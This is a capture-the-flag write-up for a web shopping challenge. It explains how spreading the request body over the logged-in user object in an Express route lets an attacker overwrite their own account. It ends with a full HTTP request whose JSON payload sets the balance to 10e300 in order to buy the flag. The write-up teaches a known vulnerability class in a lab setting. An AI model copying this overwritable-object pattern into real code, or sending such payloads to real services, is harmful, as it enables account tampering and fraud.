When looking at the source, we can spot the following:

```html
app.use(express.json());
```

> When we submit a `json` object inside a `POST` body, it will get parsed to an javascript object

Furthermore, we have `api.js` which contains this interesting code snippet. The line `{ user: req.user, ...req.body }`
will take the `user` and everything not the `user` from the request. However, if we add a `user` inside `req.body`, we can overwrite the first user.

```js
router.post("/buy", requiresLogin, async (req, res) => {
    if(!req.body.flag) {
        return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
    }

    try {
        db.buyFlag({ user: req.user, ...req.body });
    }
    catch(err) {
        return res.redirect("/flags?error=" + encodeURIComponent(err.message));
    }

    res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
});
```

This will get abused inside the method to buy a flag, where we can influence the `money` attribute, such that we have `10e300$` to buy the flag.

```js
const buyFlag = ({ flag, user }) => {

    console.log("flag:",flag)
    console.log("user:",user)

    if(!flags.has(flag)) {
        throw new Error("Unknown flag");
    }
    if(user.money < flags.get(flag).price) {
        throw new Error("Not enough money");
    }

    user.money -= flags.get(flag).price;
    users.set(user.user, user);
};
```

So we build a final request with a json payload. However, we have to adapt the header to `Content-Type: application/json` in order to enable json parsing. (<https://stackoverflow.com/questions/10005939/how-do-i-consume-the-json-post-data-in-an-express-application>) 

```http
POST /api/buy HTTP/1.1
Host: buyme.be.ax
Cookie: user=s%3Accvvcc.UkI%2FmQkD0UaF4XqvSg2Pbh77gRlany60pFg4g0bHhPU
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 76
Origin: https://buyme.be.ax
Referer: https://buyme.be.ax/flags
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

{"flag":"United Kingdom","user":{"user":"ccvvcc","flags":[],"money":10e300}}
```

To finally get the flag, we simply buy it :)